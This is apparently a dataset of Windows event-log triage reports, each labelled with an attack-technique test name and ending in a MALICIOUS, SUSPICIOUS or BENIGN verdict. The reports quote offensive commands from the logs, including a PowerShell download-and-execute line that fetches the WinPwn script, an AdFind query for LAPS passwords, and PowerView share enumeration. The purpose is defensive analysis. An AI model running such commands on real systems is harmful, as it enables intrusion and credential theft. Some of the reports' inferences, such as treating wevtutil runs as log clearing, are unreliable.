   - These changes may not be related to the PowerShell activities but should be monitored as potential indicators if combined with other suspicious behavior.

### 5. System Log Analysis:
- Time synchronization events with `time.windows.com`, but these are normal system behaviors and do not directly indicate compromise.

### Assessment:
The PowerShell command observed is highly suspicious and indicative of malicious activity. The command is attempting to download and execute a script from an external source using a framework known for illicit post-exploitation activities (Empire project). The combined use of execution policy bypass and the remote script invocation indicates potential compromise.

### Guidance:
1. **Immediate Actions**:
   - Isolate the affected system (Server002) to prevent further potential threats to the network.
   - Conduct a full malware scan on the system.
   - Verify and restrict network and external web access to/from the host until a clear understanding of the compromise is obtained.
   - Change credentials for users associated with logged activities, particularly the `admin_test` user or any users found on the compromised machine.

2. **Further Investigation**:
   - Examine user activity leading up to these logs.
   - Review any changes in system configurations and scheduled tasks.
   - Analyze network traffic for any anomalous communication to the IP(s) or domains involved.
   - Collect and store relevant evidence for potential forensic investigation.

### Resolution:
**MALICIOUS** - The use of PowerShell to execute scripts from a known exploitation framework strongly indicates malicious activity. Immediate action is required to neutralize any potential threat."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"Upon analysis of the provided Windows event logs, here are the observations and assessment:

### Security Logs
- **Events 4616:** Involves changes to system time by the `svchost.exe` process, running under the `LOCAL SERVICE` account. While process `svchost.exe` is legitimate, any changes to system time can sometimes indicate a compromise attempt, as attackers may alter times to manipulate logs or evade timeline analysis. However, further investigation is needed on why these changes were occurring and should be cross-referenced with any known scheduled tasks or legitimate administrative changes.

### Windows PowerShell Logs
- **PowerShell Events (ID 600):** The use of PowerShell to check for virtualization environments (Hyper-V, VMware, VirtualBox) indicates that someone executed a script to determine the environment type. This behavior may occur during reconnaissance by sophisticated malware that checks the environment to avoid detection or obstacles. The script itself doesn't perform any malicious activity but its presence and execution need further investigation, especially if not conducted by known and authorized IT personnel or automated systems.

### Application Logs
- **Event 16384 (Software Protection Platform Service):** This log entry does not indicate suspicious activity directly related to compromise.
- **Edge Update (Service stopped):** This is legitimate traffic related to Microsoft Edge update processes.

### System Logs
- **Event ID 24 & 1 (Kernel-General):** These logs reflect system time changes, already noted in the Security logs, recommended to review combined with Security log analysis.

### Sysmon Logs
- **Process Creation and Execution (Sysmon Events):** Observed multiple legitimate Windows system utilities such as `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were executed by `SERVER002\admin_test` user. Execution of `wevtutil.exe` for accessing event logs is generally benign but can be used in lateral movement or data exfiltration context if not performed by authorized personnel. Review the context of these executions.
- **PowerShell Execution (Process ID 6736):** Repeated PowerShell executions are concerning as they could denote script-based infection or activity. However, the content of the executed script aligns with checking the host environment and does not show immediately malicious intent.

### Overall Analysis
- There is notable PowerShell activity with the script aiming to detect virtual environments. While not directly malicious on its own, this can be seen in scripts evaluating environments for specific execution or avoiding sandbox/protected areas.
- System time alterations could potentially be concerning but lack context in provided logs.
- Multiple process executions through test/admin account warrant closer review for any unsanctioned activity.

### Guidance
Given this analysis, the situation can be categorized as **SUSPICIOUS**. There are potential concerns regarding script execution with PowerShell and system time alterations which need further investigation. Steps to take include:
1. Determine the source and authorization of the PowerShell script execution.
2. Verify the legitimacy of system time changes with system policies or admin activities.
3. Conduct deeper behavioral analysis on `admin_test` for irregular activities during and around the time frame of the logs.
4. Review other related log files such as Scheduled Tasks or Group Policy Objects that could shed more light on these activities.

In-depth analysis and possibly threat hunting activities are recommended to rule out or confirm malicious intent."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"### Detailed Analysis

#### Security Logs Analysis
- The Security logs detail two events with Event ID 4616, indicating a system time change initiated by the svchost.exe process running under the LOCAL SERVICE account. System time changes can be indicative of an attempt to mislead log entries or other time-dependent processes but can also occur in benign configurations or updates.

#### PowerShell Logs Analysis
- There are multiple PowerShell log events with Event ID 600, capturing the execution of the PowerShell engine that runs a script executing ""AdFind.exe"" from a temporary directory. This behavior is suspicious because:
  - The PowerShell command invokes a third-party tool, AdFind.exe, which is commonly used for querying Active Directory data. 
  - The path ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" indicates the execution from a suspect location (temporary files directory).
  - The command arguments suggest querying sensitive information from Active Directory using parameters related to potentially sensitive attributes like ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime, which are typically associated with LAPS (Local Administrator Password Solution).

#### System Logs Analysis
- System logs record detailed system-level operations, including time adjustments performed by svchost.exe. The details here appear consistent with those in the Security logs, indicating synchronization actions with ""time.windows.com."" These do not immediately imply malicious behavior unless corroborated with other events.

#### Sysmon Logs Analysis
- Sysmon logs show the execution of standard Windows processes like whoami.exe, hostname.exe, and conhost.exe under the user context ""SERVER002\\admin_test."" While generally benign, these activities suggest user context operations rather than system operations.
- Noteworthy is the launch of PowerShell processes with elevated privileges (IntegrityLevel: High) from commands linked to PowerShell executing AdFind.exe, reinforcing the suspicion of the PowerShell logs.
- Additionally, wevtutil.exe (the Windows Event Utility) is executed multiple times with no explicit command flags, which if unexplained or unaccounted for by normal administrative activity, may be used to enumerate or manage event logs covertly.

### Assessment and Resolution
The combination of suspicious PowerShell command executions involving AdFind.exe from a temporary directory, coupled with elevated execution privileges, and potential enumeration via wevtutil.exe, strongly indicates suspicious activities.

- **Resolution: SUSPICIOUS.** The log entries suggest activities that necessitate further investigation due to the unconventional execution context of AdFind.exe and potential Active Directory querying without an identifiable legitimate purpose. Given the potential implications, investigating the source and context of the PowerShell script, verifying alterative use approvals for AdFind.exe, and reviewing the accounts' intended activities could provide clarity.

### Guidance on Procedural Next Steps
1. **Collect Artifacts:**
   - Retrieve associated script files or contents from the temporary execution paths.
   - Gather potential logs from AdFind executions for evidence of targeted queries.

2. **Review and Analyse:**
   - Conduct further review of user account activities to establish a pattern of use or deviation.
   - Examine permissions and recent account modifications concerning the attributes queried.

3. **Containment and Communication:**
   - Communicate security posture or findings to IT operations to validate intended activities.
   - If unauthorized activity is confirmed, proceed with containment steps, including revoking permissions or isolating the system for further forensic investigation.

4. **Assure Continuity and Hardening:**
   - Implement enhanced monitoring and alerts for further anomalous activities.
   - Consider applying policies to restrict execution in temporary directories and bolster user account management controls."

### Key Observations:

1. **System and Security Events:**
   - The logs include standard Windows update checks and time synchronization activities. These are generally benign unless they coincide with known attack timings or triggers.
   - Security logs indicate time adjustments through svchost.exe, but this is a common activity for maintaining system time accuracy. 
   - The presence of legitimate processes such as Windows Update Client, svchost.exe, and Windows Time Service are observed, consistent with regular system operations.

2. **Sysmon Events:**
   - Numerous operations related to the installation and update of Microsoft Edge are observed:
     - The execution of MicrosoftEdgeUpdate.exe and related setup executables seems voluminous, but they are likely associated with an automated update process.
     - The command-line arguments and system integrity levels for these processes align with typical system updates.
   - No unusual access attempts, privilege escalations, or unexpected network activities are evident in these Sysmon logs.

3. **Miscellaneous Processes:**
   - Processes like wevtutil.exe and conhost.exe are seen executing, but notably under the user SERVER002\admin_test. This implies a possible administrator running these tasks, likely for log viewing or administrative console sessions. The usage appears consistent with legitimate system management or troubleshooting actions.
   - The `cmd.exe` executing ""net share"" can be considered usual in an administrative context but warrants further context determination ensuring no intrusive entries or alterations have occurred to shared resources without intent.

4. **Windows PowerShell Log:**
   - The log seems it contains no entries at the moment, implying no detected execution or invocation that could suggest script-based attacks via PowerShell.

### Conclusion:

Based on the evidence and patterns noted in the logs, there are no distinctly malicious activities detected. Activities related to Microsoft Edge and Defender updates, along with system time adjustments, appear consistent with normal operations. The presence of administrative-level commands issued by an identifiable user aligns with routine administration rather than suspicious activity.

**Resolution: BENIGN**

### Guidance on Proceeding:

- Continue monitoring for updates or changes in patterns, especially around the administrative logons and Edge updates.
- Optionally, verify the purpose and approval of any administrative shares or changes observed to ensure they align with policy or expected behaviors.
- Maintain a log and alert system for any shifts in these baseline activities to quickly identify truly anomalous behavior in the future. 

It's essential to stay vigilant and routinely evaluate security configurations and update procedures to prevent potential abuse of administrative privileges."
Enumerate Remote Hosts with Netscan,"Upon analyzing the provided Windows event logs, here are the observations and a detailed analysis of any suspicious or anomalous behavior.

### Analysis:

1. **Security Logs (EventID 5379)**:
   - These events are related to Credential Validation. The logs show repeated attempts to validate credentials with a ReturnCode of `3221226021`, which corresponds to an invalid handle. The SubjectUserSid is `S-1-5-18`, which typically represents LocalSystem, indicating these are system-level processes.
   - Such failed attempts could indicate a potential issue; however, without direct evidence of misuse or escalation, these could also be indicative of some misconfiguration or benign system processes unsuccessfully trying to access credentials.

2. **Sysmon Logs**:
   - **EventID 1 (Process Creation)**:
     - Observation of a process related to installing/updating Microsoft Edge. The file paths and command lines suggest legitimate installation activities.
     - Multiple process creation logs involving `powershell.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`, indicating potential automation tasks or scripted operations.
   - **EventID 5 (Process Termination)**:
     - Regular process terminations of standard processes (`wevtutil.exe`, `conhost.exe`) which is expected in normal operations especially in environments where scripting and logging are often manipulated.
   - Detection of `netscan.exe` being executed, which is a network scanner. The scanner was run on localhost (127.0.0.1), which might be part of a legitimate internal audit or monitoring but could also indicate a first step of reconnaissance.

3. **Windows PowerShell Logs**:
   - PowerShell commands are shown to utilize external scripts: `netscan.exe` as evident from the EventIDs 600 and 403. This process of launching PowerShell to execute a network scanner via command line is quite advanced for an end-user and could imply potentially malicious scans.
   
4. **System Logs**:
   - Updates to 'Microsoft Defender Antivirus' indicate that the system is being updated regularly, which is good for security.

5. **Application Logs**:
   - Windows Defender is in state ON, showing that antivirus protection is active and running on the system.

### Assessment:

- **Anomalous Activities**:
  - The execution of `netscan.exe` from PowerShell is somewhat suspicious, depending on the context. In a typical environment, such tools would only be run by authorized personnel with IT or security responsibilities. It's pertinent to verify if 'admin_test' was authorized or if this was scheduled/intended.

- **Normal Activities**:
  - The processes related to Microsoft Edge updates, Windows Defender updates, and general system processes (services and svchost) appear benign and align with expected system maintenance and update procedures.

### Risk and Threats:
- The usage of `netscan.exe` needs careful evaluation to rule out unauthorized reconnaissance activities. If `admin_test` or `SERVER002` is breached, there could be risks of lateral movement or further compromise.

### Guidance:

1. **Confirm Intent**: Verify if the execution of `netscan.exe` was part of an authorized scan. Check with IT or administration departments whether 'admin_test' initiated/testing purposes or investigate further through interviewing the involved personnel.

2. **Evaluate Access Logs**: Review physical or remote access logs around the time these actions took place for any unauthorized access or unfamiliar login patterns.

3. **Increase Monitoring**: Set up additional monitoring on `SERVER002` specifically focusing on PowerShell, and particularly looking for similar processes or potentially harmful activities.

4. **Network Activity**: Analyze network traffic around these events for any suspicious connections or data transfers.

### Resolution:
Based on the logs provided: **SUSPICIOUS**. The activities involving `netscan.exe` and PowerShell require further investigation to ensure they were benign operations."
Peripheral Device Discovery via fsutil,"**Analysis of Windows Event Logs:**

**Application Log:**

- Logs from the `edgeupdate` service and `Microsoft-Windows-Security-SPP` (Software Protection Platform Service) show normal activity related to the stopping and starting of the Edge Update service and normal software protection service events. No anomalous behavior or malicious indicators are present.

**System Log:**

- It shows usual time change activity logged by `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`. Time adjustments via NTP (Network Time Protocol) are often expected in standard operations for time synchronization. No indications of malicious intent or exploitation are detected here.

**Windows PowerShell Log:**

- There is no data available for analysis in the PowerShell log.

**Security Log:**

- The log has events indicating time changes which align with the system log entries. The `Security` events from `Microsoft-Windows-Security-Auditing` show `TimeChange` events logged for the `LOCAL SERVICE`. This is consistent with normal system clock adjustments and does not suggest any unauthorized or malicious activity.

**Sysmon Log:**

- The Sysmon logs capture processes related to common utility executions (`hostname.exe`, `conhost.exe`, `whoami.exe`, `wevtutil.exe`) which appear to be executed by `admin_test` user. These are typical operations that do not appear inherently harmful on their own.
  
- Detailed logs from `MicrosoftEdgeUpdate.exe` reflect standard behaviors associated with Microsoft Edge updates. The numerous updates, along with processes like `MicrosoftEdgeUpdateSetup.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`, are indicative of typical software update processes.

- No irregular command-line arguments or processes related to known malware behaviors are present in the captured events.

**Summary & Assessment:**

The analysis of the event logs across these components shows no definitive indicators of malicious activity or compromise. The entries reflect routine operations, including scheduled updates and system time synchronization tasks. The series of events tied to Microsoft Edge updates are consistent with legitimate update and registration activities performed by the system.

**Resolution: BENIGN**

The activities logged are deemed benign, reflecting standard system and application behaviors within a Windows environment. No further investigation is warranted based on the current data provided. However, continued monitoring for any irregular activities or behaviors is always prudent in maintaining security vigilance."
Enumerate all accounts via PowerShell (Domain),"Upon analyzing the logs provided, a few observations can be made:

1. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed nearly simultaneously by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility often used to interact with event logs, and `conhost.exe` is a legitimate console window host process supporting command-line execution and communication. However, the frequent and consecutive invocation of these processes can sometimes indicate behavior typical of attackers clearing logs or preparing the environment without leaving traces.

2. **Execution of Command-Line Tools:**
   - `hostname.exe` and `whoami.exe` are observed being executed, which are typically benign as they are used to retrieve system and user information, respectively. However, their usage in conjunction with other activities may suggest reconnaissance actions.

3. **PowerShell Script Execution:**
   - There is evidence of a PowerShell command execution from `SERVER002\admin_test` with the command line `""powershell.exe"" & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}`. This command effectively enumerates user groups and Active Directory users, which could be typical behavior for user enumeration during lateral movement or reconnaissance in a domain environment.

4. **Scheduled Windows Services:**
   - Observations of processes such as `sppsvc.exe`, `WmiPrvSE.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` are present. These are standard Windows services related to licensing, Windows Management Instrumentation, system maintenance, and updates, respectively, and are not inherently suspicious.

5. **Net Commands:**
   - There is usage of both `net.exe` and `net1.exe` with the command `user /domain`, which looks like an enumeration command, typically used for gathering network information about domain users. This could be legitimate usage but requires context for the action to ensure it's not part of unauthorized enumeration efforts.

Based on the information provided:

- **Assessment:** The activity involves several commands and system utility executions that align with either legitimate administration/troubleshooting or potentially unauthorized reconnaissance and monitoring. The concurrent use of system utilities for gathering system and user information is particularly noteworthy.

- **Threats/Risks Identified:** The risks involve unauthorized access or scanning of internal networks. The use of PowerShell for enumerating domain user info suggests potential lateral movement attempts.

- **Guidance:**
  - Verify if `admin_test` had legitimate reasons for running these commands.
  - Review access logs and permissions for `admin_test` to ensure it aligns with job responsibilities.
  - Look for any other indications of unusual access or data exfiltration attempts.

**Final Resolution: SUSPICIOUS**

This activity leans toward being suspicious due to the nature of the commands executed and their potential for misuse; further investigation and context are required to determine if this behavior is indeed authorized or if it's an early sign of malicious activity."
System Information Discovery with WMIC,"### Analysis:

Upon examining the provided Windows event logs, several observations can be made:

1. **Unusual Executions:**
   - Usage of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` repeatedly executed by the user `SERVER002\\admin_test`, originating from `wsmprovhost.exe` (Windows Remote Management provider host).
   - These tools (`whoami`, `hostname`, `wevtutil`) are legitimate Windows utilities. However, repeated use, particularly of `wevtutil.exe` to presumably query or manage event logs, may suggest a reconnaissance or lateral movement phase that is common in penetration testing or early cyber attack stages.

2. **High Integrity Level:**
   - The processes are initiated with a high integrity level by `admin_test` user, indicating elevated privileges. This can be flagged as unusual if not typical for this user’s activity.

3. **Command Line Executions:**
   - Execution of `cmd.exe` with a complex command line involving various `wmic` queries to gather hardware and OS information. The use of `wmic` in succession for querying system details (like CPU, memory, BIOS, and disks) can be indicative of system profiling for exploitation or exfiltration.
   - Execution of `MicrosoftEdgeUpdate.exe` with several different command line arguments (`/update`, `/regsvc`, `/regserver`, etc.). These are consistent with valid operations of updating Microsoft Edge, which happen under `NT AUTHORITY\\SYSTEM`.

4. **Microsoft Edge Updates:**
   - Numerous instances of `MicrosoftEdgeUpdate.exe` and related binaries indicate ongoing updates or installations. The updates are run under the system account, which is typical behavior for software updates. The presence in temporary folders may raise slight flags but are not immediately suspicious given the context of update activity.
  
5. **Logging Service:**
   - Multiple executions of `wevtutil.exe` suggest possible interaction with Windows Event Log services, possibly for tampering or querying logs. This activity was more frequent compared to what might be expected in normal operations, hinting at potential log clearance efforts.

### Conclusion and Assessment:

Based on the analysis, below are the primary conclusions:

- **Indicators of Suspicious Activity:**
  - There’s a pattern of using built-in Windows utilities like `whoami`, `wmic`, and `wevtutil` which, in particular context and repetition, raise a suspicion.
  - Execution patterns and the high integrity level under specific user accounts indicate potential misuse or unauthorized query of system information.

- **Software Updates:**
  - The Edge update processes, while numerous, appear consistent with legitimate update activity. There is no discernible indication of compromise associated with these processes.

### Recommendation:

Given the investigation results:

- **Resolution: SUSPICIOUS**

While there's no clear evidence of outright malicious activity, the pattern of tool usage and the privilege level suggest activities that are atypical for normal user behavior and should be investigated further. It is recommended to:
- Conduct further analysis to validate the legitimacy of actions executed by `admin_test`.
- Review abnormal command line patterns and privilege escalation attempts.
- Implement additional monitoring on critical systems for any further or related suspicious activity. 

Log inspection should be combined with a review of access permissions and validation of user roles on `SERVER002`."
PowerView ShareFinder,"### Detailed Analysis of the Logs

Upon examining the provided logs, a series of events have been identified that warrant closer inspection. Below are the analysis breakdowns per log type:

#### **Windows PowerShell Logs:**

- **Suspicious Script Execution:** The logs show multiple instances of PowerShell executing with the command:
  
  ```powershell
  Import-Module ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\PowerView.ps1""; Invoke-ShareFinder -CheckShareAccess
  ```

  **PowerView** is a well-known tool used for network enumeration and lateral movement within environments, often used by attackers to identify valuable network resources. The execution path also appears unusual as it involves temporary directories which are commonly used for execution attempts that try to evade detection.

#### **System Logs:**

- **Time Change Events:** There are Kernel and Time Service logs indicating a change to the system time. Although this can be legitimate, unauthorized changes to system time can be a sign of an attacker trying to align timestamps for activities or to evade detection logs.

#### **Security Logs:**

- **High Privilege Use (Event ID 4672):** High privileges were observed being enabled for the `SYSTEM` user which, while possibly normal, could be concerning if linked with malicious activities.

- **Frequent Account Enumeration (Event ID 4798):** Numerous instances of account enumerations occur within a very short time span. This can be symptomatic of reconnaissance activities by an attacker to gather information on the system’s user accounts.

#### **Sysmon Logs:**

- **Process Creation:** There are multiple `""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""` processes created under suspicious circumstances showing execution of external scripts, suggesting possible malicious script execution.

- **Multiple Edge Updates:** Legitimate Edge Update processes are noted but their frequency and diversity of operations in conjunction with the suspicious PowerShell execution might suggest they are used as decoy or escalation paths.

### Assessment of the Situation

The log entries display activities consistent with potential reconnaissance and enumeration using PowerShell scripts, particularly PowerView. The quick succession and temporary path utilized in PowerShell executables add weight to concerns about malicious intent. While Microsoft Edge Updates are recurring processes, their presence might be unrelated but worth noting to ensure no tampering or malware camouflaging.

The combination of PowerShell activity and user account enumeration raises concerns of an active intruder within the system performing network discovery and potentially preparing for lateral movement or further exploitation.

### Threats, Risks, and Guidance on How to Proceed

**Identified Threats:**
- Potential malicious actor using PowerView for reconnaissance.
- Enumeration of account data and elevated privileges.
    
**Risks:**
- Unauthorized access to sensitive information on the network.
- Risk of lateral movement and compromised data integrity.
    
**Recommended Actions:**
1. **Isolate the Affected System:** Temporarily isolate `Server002` from the network to prevent lateral movement.
2. **Review User Activity:** Investigate recent activities associated with the `admin_test` account and ensure it aligns with expected behavior.
3. **Conduct a Thorough Incident Investigation:** Engage in a detailed review of network traffic, additional system logs, and access records related to `Server002` to understand the full extent of activity.
4. **Deploy Security Tools for Further Monitoring:** Utilize advanced threat detection tools to monitor any further malicious activities.
5. **Patch and Harden Systems:** Ensure all edge cases and software are updated to mitigate vulnerabilities.
6. **Increase User Awareness:** Conduct training on recognizing and avoiding activities that could inadvertently aid a malicious actor.
   
### Resolution

The activities identified in the logs are deemed SUSPICIOUS. They indicate potential malicious actions warranting immediate investigation and verification to mitigate any risks of network compromise or further exploitation."
WinPwn - Morerecon,"### Detailed Analysis of the Logs:

#### 1. **PowerShell Logs:**
- The logs indicate execution of PowerShell commands that include downloading and executing a script hosted on GitHub:
  - The script is fetched from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`.
  - It is executed using `iex (new-object net.webclient).downloadstring(...)`, a method commonly used to execute scripts directly from the internet. This is a red flag as it's often associated with malicious activity such as fileless malware attacks.
  
#### 2. **Security Logs:**
- **Logon and Logoff Events:**
  - User `admin_test` performed a network logon (Logon Type 3). This seems consistent with remote session or network operations.
- **Privilege Escalation:**
  - The same user `admin_test` was granted several high privileges, including `SeDebugPrivilege` which can be used to bypass normal permission checks. Often, administrators have this, but its usage should be scrutinized.

#### 3. **Sysmon Logs:**
- Frequent execution of Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by user `SERVER002\\admin_test` are recorded.
  - While generally benign on their own, the context in which they are executed (shortly after the PowerShell activity) could indicate enumerative recon activities following the script execution.
- **Process Creation:**
  - A PowerShell process is recorded with the same command line activity described in the PowerShell logs which confirms that the suspicious script was executed.

#### 4. **Application Logs:**
- Routine updates related to Microsoft Edge are noted, which appear benign and separate from the malicious PowerShell activity.

### Assessment and Conclusion:

- **Suspicious Activities Identified:**
  - Use of `iex (new-object net.webclient).downloadstring(...)` to download and execute scripts from an external URL is often linked to malicious intentions.
  - The downloaded script's purpose is unclear, warranting caution, especially on the CEO's machine.
  - High privileges were granted around the same time as script execution, albeit on an administrative account.

### Resolution: SUSPICIOUS

#### Recommendations for Further Actions:

1. **Investigate the Downloaded Script:**
   - Analyze the `WinPwn.ps1` script for harmful activities such as data exfiltration or further malicious payloads.
   
2. **Network Segmentation:**
   - Isolate the affected machine (if feasible) until a more thorough investigation can be conducted.

3. **Audit User Activity:**
   - Review recent account activities for `admin_test` and monitor for ongoing suspicious actions. 

4. **Deploy Enhanced Monitoring:**
   - Use threat detection tools to better monitor PowerShell activities, especially those that involve external communications.

5. **Review Security Policies:**
   - Ensure that high privileges are essential for accounts and consider employing more granular privilege management if not already in place.

6. **Check for Additional Indicators:**
   - Conduct a broader system and network scan to identify potential additional compromises. 

7. **Communicate with Leadership:**
   - Inform relevant stakeholders of potential security issues and the immediate steps being taken."
System Network Connections Discovery with PowerShell,"Upon analyzing the provided Windows event logs from PowerShell, Sysmon, Application, System, and Security logs, here are the key observations and assessments:

### PowerShell Log Analysis
1. **PowerShell Execution**: There are multiple PowerShell events recorded indicating the execution of the command: `powershell.exe & {Get-NetTCPConnection}`. This command is typically used to retrieve network connections on the machine.
   - **Host**: ConsoleHost
   - **Suspicious Usage**: The use of PowerShell to query network connections can be used by both system administrators and by malicious actors for reconnaissance. 

### Sysmon Log Analysis
1. **Process Execution**: Multiple `wevtutil.exe` and `conhost.exe` processes were executed by the user `SERVER002\admin_test`.
   - **wevtutil.exe**: This tool manipulates Windows event logs, which may indicate log clearing activities often associated with obfuscating malicious activities.
   - **conhost.exe**: Often linked with command prompt operations, not inherently suspicious unless accompanying malicious processes.
2. **Other Process Executions**: Processes like `hostname.exe` and `whoami.exe` are observed, typically benign but commonly used for information gathering.
3. **PowerShell Execution**: Confirmed execution with process ID 5988, substantiating the PowerShell log entries.

### Application, System, and Security Log Analysis
1. **Security Time Change Logs**: Logs show a time change event where the system time was set back by approximately 28 seconds. This can sometimes be used to flush out volatile logs or reset timestamps, often a sign of malicious activity.
2. **Time Synchronization**: Observed with `time.windows.com`, seems legitimate.
3. **Software Protection Platform (SPP)**: Indicates system routine checks.

### Overall Assessment
- **Anomalous Process Behavior**: The usage of `wevtutil.exe` along with the time change event is indicative of potential log manipulation, a tactic used to hide malicious actions.
- **PowerShell Usage**: While `Get-NetTCPConnection` can be legitimate, its presence in this context should be noted due to suspicious activities.
- **User Account Activity**: The frequent processes initiated under the `admin_test` account need review, especially distinguishing between legitimate administrative actions versus potential abuse.

### Conclusion
- **Resolution**: **SUSPICIOUS**
  - The logs contain activity that merits further investigation. While no outright malicious action is observed, the combination of PowerShell use for network reconnaissance, suspicious process executions (`wevtutil.exe`), and the time rollback requires closer examination to rule out a stealth attack or unauthorized information gathering.

### Suggested Next Steps
1. **Investigate User Activities**: Validate `admin_test` user's recent activities, ensuring they align with legitimate duties.
2. **Review Event Logs and Network Data**: Check for gaps or missing logs that might have been tampered with and examine network logs for unusual outbound connections.
3. **Conduct Endpoint Security Checks**: Run additional scans with updated threat intelligence for any malware indicators.
4. **Consider Enabling Enhanced Logging**: To detect potential PowerShell or system logs obfuscation in the future, consider enabling script block logging and module logging.

In conclusion, while the event logs do not conclusively indicate a malicious breach, the identified activities suggest that there is unusual behavior requiring further scrutiny to confirm system integrity and security."
Port-Scanning -24 Subnet with PowerShell,"### Detailed Analysis

Upon examining the provided event logs from the Windows host (Server002), a few observations stand out regarding potentially suspicious behavior:

#### System and Security Logs
1. **Time Change Events**: The system logs show evidence of time changes (EventID 24 and 1 in the System log, and EventID 4616 in the Security log). The system clock being changed can be a technique used by an adversary to alter the timeline of events to confuse forensic investigations. These alerts cannot be immediately marked malicious because they could be due to legitimate system clock adjustments or time synchronization protocols.

2. **Privilege Escalation**: The security logs reveal EventID 4672 for two different accounts (`SYSTEM` and `admin_test`) gaining privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, among others. This is common when certain applications or services require specific rights but should be viewed in context.

3. **Pattern of Logons**: Repeated logons (EventID 4624) for `SYSTEM` and the user `admin_test` are observed, some involving elevated tokens, indicating potential administrative actions being performed remotely or via scripts. The logon type `3` suggests network logons.

#### Sysmon Logs
1. **PowerShell Execution**: A notable PowerShell script execution is observed, indicating network scanning activity. The script appears to obtain network interface details and perform a port scan across subnets (ports 3389 and 445) which corresponds to EventID 1 in Sysmon logs detailing execution of `powershell.exe`. These actions are distinctly suspicious, as they can indicate reconnaissance activity by an attacker attempting lateral movement within the network.

2. **Multiple Instances of `wevtutil.exe` and `conhost.exe`**: These processes ran several times almost simultaneously, possibly indicating a scripted or automated task, but this in itself is not inherently malicious.

#### Windows PowerShell Logs
Entries show the execution of the same PowerShell script, highlighting commands related to network interface enumeration and port scanning. These logs parallel suspicious activity noted in the Sysmon logs.

#### Application Logs
Primarily document application activities, such as edge updates and software protection events, which are routine.

### Assessment
- **Suspicious PowerShell Activity**: The execution of a PowerShell script performing network reconnaissance, especially from a host like a CEO's machine, raises significant concern. This aligns with a typical attack pattern where intruders look for open ports to exploit further.
- **Time Alterations**: While potentially benign, the context of other suspicious activities makes these events worth a secondary review.
- **Privilege Escalation**: The granting of extensive privileges to processes should be reviewed along with corroborating evidence of misuse.

### Resolution
Based on the evidence above:
- **Resolution**: **SUSPICIOUS** - The logs show activity that appears out of place and requires further investigation to ascertain the legitimacy or malicious intent. The unusual time changes and PowerShell execution, particularly given the target is sensitive in nature (i.e., the CEO's machine), suggest potential unauthorized activities.

### Guidance on How to Proceed
1. **Investigate the Source**: Verify if the observed PowerShell activities have any legitimate history within the organization or if they were legitimately performed by the user `admin_test`.

2. **Review Clock Changes**: Check for any authorized processes or manual changes that might explain the time changes.

3. **Contain and Analyze**: If these activities are unauthorized, isolate the host system to prevent further potential spread or damage, and conduct a thorough forensic analysis.

4. **Monitor and Harden**: Implement logging and monitoring for PowerShell activities and apply security patches or updates to close known entry points (ports 3389 and 445 are frequently targeted for RDP and SMB vulnerabilities).

5. **User Awareness and Training**: Enhance security training to recognize and report unusual activities."
Get-WmiObject to Enumerate Domain Controllers,"Upon analyzing the provided Windows event logs for signs of malicious activity, several indicators were identified that warrant further investigation:

**Sysmon Logs:**

1. **Presence of High-Integrity Level Processes:**
   - Powershell Execution: There are multiple instances of PowerShell execution. The command-line execution captures a PowerShell command attempting to retrieve WMI information from the `ds_computer` class, which itself is not inherently suspicious but can indicate reconnaissance activity when seen in conjunction with other events. These PowerShell activities are logged with a high integrity level under the user `SERVER002\\admin_test`.

2. **Repeated Instances of Certain Executables:**
   - `wevtutil.exe` and `conhost.exe`: There are repeated instances of `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Window Host) processes executed under the `admin_test` account. The legitimate use of `wevtutil.exe` should be validated, as it is commonly used to query, export, clear, and back up event logs, often a part of malicious actor activity to cover tracks.

3. **Use of Administrative Privileges:**
   - The user `admin_test` is granted several high privileges (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), which is unusual outside of specific maintenance tasks and might be leveraged by malicious actors to escalate privileges.

**Windows Security Logs:**

1. **Time Change Events:**
   - There are events indicating a change in system time. Time rollback activity is occasionally used by attackers attempting to hide their traces or to circumvent time-limited security features.

2. **IP Address Links to Remote Logons:**
   - Logon from an IP (`fe80::e3b5:5371:12a8:9c77`) using NTLM which could be legitimate but should be checked against expected remote access from high privileged accounts.

**Windows Update Logs:**

- Consistent with benign system operation, showing updates of Windows Defender, indicative of normal operation ensuring security measures are active.

**PowerShell Logs:**

- Various powershell activities logged indicate what might be scripts doing system checks or other automated tasks but should be verified to ensure they align with expected behavior for that account and function.

**Assessment:**

Based on the above findings, there are signs of potential suspicious activity:
- Multiple `wevtutil.exe` executions in close succession.
- High integrity and administrative-level PowerShell executions without detailed command disclosure.
- Time changes, while possibly legitimate, should align with system updates or other planned activities.

**Resolution: SUSPICIOUS**

The combination of factors such as potential reconnaissance, unauthorized privilege escalation tactics, and system time manipulation raise concerns. Further steps should involve:
- Validating the legitimacy of scripts executed by `powershell.exe` and the need for admin-level access during these operations.
- Verifying if `admin_test` account activities align with expected tasks and are authorized.
- Investigating the origin/source of the remote logins and their necessity.
- Conducting deeper analysis on the chain of process executions involving `wevtutil.exe` and `conhost.exe`.

These logs merit increased monitoring with potential escalation for forensics analysis to ensure no compromise has occurred."
Security Software Discovery - Windows Firewall Enumeration,"Upon reviewing the provided logs from multiple channels (System, Application, Windows PowerShell, Security, and Sysmon), I'll analyze the activities and assess whether any malicious behavior can be detected.

### System Log
- Entries primarily show routine updates and time synchronization events. Notably:
